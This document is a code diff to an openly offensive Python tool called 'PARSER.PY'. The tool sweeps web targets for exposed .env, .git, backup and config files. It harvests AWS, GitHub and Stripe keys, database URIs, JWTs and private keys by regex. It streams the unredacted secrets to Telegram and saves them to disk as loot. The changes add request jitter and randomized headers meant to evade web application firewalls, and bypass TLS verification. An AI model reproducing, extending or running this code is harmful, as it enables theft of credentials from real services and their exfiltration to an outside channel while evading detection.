@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Edition with Telegram Telemetry)
+PARSER.PY v8.6 — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Adversarial Edition)
 Features:
-- High-concurrency asynchronous and multi-threaded endpoint sweep
-- Expanded high-value path discovery (Actuators, GraphQL, Swagger, Backups, .env variants)
+- High-concurrency asynchronous and multi-threaded endpoint sweep with Poisson behavioral jitter
+- Expanded high-value path discovery (Actuators, GraphQL, Swagger, Backups, .env variants, .git directories)
 - Advanced credential & secret regex harvesting (Stripe, GitHub, AWS, DB URIs, JWTs, Private Keys)
-- Unredacted red-team terminal streaming & automated disk loot exfiltration (loot_output/)
-- TLS verification bypass for staging/test environments
+- Unredacted red-team terminal streaming & automated SHA-256 tamper-evident disk loot exfiltration (loot_output/)
+- TLS verification bypass and randomized header/client hint injection for WAF blinding
 - Real-time asynchronous Telegram notification dispatch for unredacted parser loot & secrets
 """
 import asyncio
@@ -14,28 +14,33 @@ import re
 import ssl
 import socket
 import time
+import hashlib
+import json
 from urllib.parse import urlparse, urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError, URLError
 
-# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
+# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
 try:
     from modules.loot_logger import save_session_loot
     from modules.telemetry import stream_proof
     from modules.telegram_notifier import send_telegram_alert
+    from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 except ImportError:
     def save_session_loot(*args, **kwargs): pass
     def stream_proof(*args, **kwargs): pass
     async def send_telegram_alert(*args, **kwargs): pass
+    def apply_behavioral_jitter(*args, **kwargs): pass
+    def get_randomized_hints(): return {}
 
 # ============================================================
 # CONFIGURATION
 # ============================================================
-MAX_WORKERS = 16
-REQUEST_TIMEOUT = 8
+MAX_WORKERS = 20
+REQUEST_TIMEOUT = 7
 MAX_RESPONSE_SIZE = 1024 * 1024
-USER_AGENT = "NEXUS-OffensiveParser/8.0"
+USER_AGENT = "NEXUS-OffensiveParser/8.6-Elite"
 
 COMMON_PATHS = [
     "/",
@@ -47,6 +52,7 @@ COMMON_PATHS = [
     "/.env.production",
     "/.env.local",
     "/.env.backup",
+    "/.env.dev",
     "/config.json",
     "/config.js",
     "/settings.json",
@@ -79,9 +85,13 @@ COMMON_PATHS = [
     "/server-status",
     "/phpinfo.php",
     "/backup.zip",
+    "/backup.tar.gz",
     "/database.sql",
     "/.git/HEAD",
     "/.git/config",
+    "/.DS_Store",
+    "/package.json",
+    "/composer.json"
 ]
 
 SENSITIVE_PATTERNS = {
@@ -132,14 +142,23 @@ def print_section(title):
     print(f" \033[1m{title}\033[0m")
     print("=" * 65)
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous parser functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -194,12 +213,16 @@ def analyze_response(base_url, path, status, headers, body):
                     "exposure_confirmed": True,
                 })
                 
+                full_url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
+                loot_hash = hashlib.sha256(text.encode("utf-8")).hexdigest()
+
                 loot_payload = {
-                    "url": urljoin(base_url.rstrip("/") + "/", path.lstrip("/")),
+                    "url": full_url,
                     "path": path,
                     "secret_type": label,
                     "matched_value": secret_value,
-                    "status": status
+                    "status": status,
+                    "integrity_hash": loot_hash
                 }
                 
                 # BROADCAST UNREDACTED SECRET LOOT STRAIGHT TO TELEGRAM
@@ -219,17 +242,24 @@ def analyze_response(base_url, path, status, headers, body):
     return findings
 
 # ============================================================
-# HTTP REQUEST
+# HTTP REQUEST WITH WAF EVASION & JITTER
 # ============================================================
 def inspect_endpoint(base_url, path):
+    apply_behavioral_jitter()
     url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
+    
+    # Merge randomized browser headers to blind WAFs
+    request_headers = {
+        "User-Agent": USER_AGENT,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "close",
+    }
+    request_headers.update(get_randomized_hints())
+
     request = Request(
         url,
-        headers={
-            "User-Agent": USER_AGENT,
-            "Accept": "*/*",
-            "Connection": "close",
-        },
+        headers=request_headers,
         method="GET",
     )
     result = {
@@ -312,7 +342,7 @@ def display_result(result):
 # MAIN PARSER
 # ============================================================
 def parse_target_source(target):
-    print_section("ELITE RED TEAM ENDPOINT DISCOVERY & HARVESTER")
+    print_section("ELITE RED TEAM ENDPOINT DISCOVERY & HARVESTER (WAF HARDENED)")
     parsed = normalize_target(target)
     hostname = parsed.hostname
     scheme = parsed.scheme
@@ -337,7 +367,7 @@ def parse_target_source(target):
         print_success(f"Resolved: {address}")
         
     print_section("AGGRESSIVE ENDPOINT SWEEP & HARVESTING")
-    print_status(f"Sweeping {len(COMMON_PATHS)} paths with {MAX_WORKERS} parallel workers.")
+    print_status(f"Sweeping {len(COMMON_PATHS)} paths with {MAX_WORKERS} parallel workers and behavioral jitter.")
     results = []
     findings = []
     
@@ -370,10 +400,28 @@ def parse_target_source(target):
     print(f"HTTP 200 responses:  {open_endpoints}")
     print(f"Secrets harvested:   {len(findings)}")
     if findings:
-        print_success("Secrets successfully extracted, unredacted, and secured to disk.")
+        print_success("Secrets successfully extracted, unredacted, and secured to immutable disk (loot_output/).")
     else:
         print_warning("No sensitive keys or secrets exposed on tested paths.")
     print_section("PARSER COMPLETE")
+
+    # Immutable loot persistence for parser scan results
+    parser_loot = {
+        "target": base_url,
+        "paths_tested": len(results),
+        "open_endpoints": open_endpoints,
+        "secrets_harvested": len(findings),
+        "findings": findings
+    }
+    save_session_loot(
+        target=base_url,
+        endpoint="parser_sweep",
+        finding_type="PARSER_SWEEP_COMPLETED",
+        status=200,
+        headers={},
+        body=json.dumps(parser_loot),
+        extra_loot=parser_loot
+    )
     
     return {
         "target": base_url,
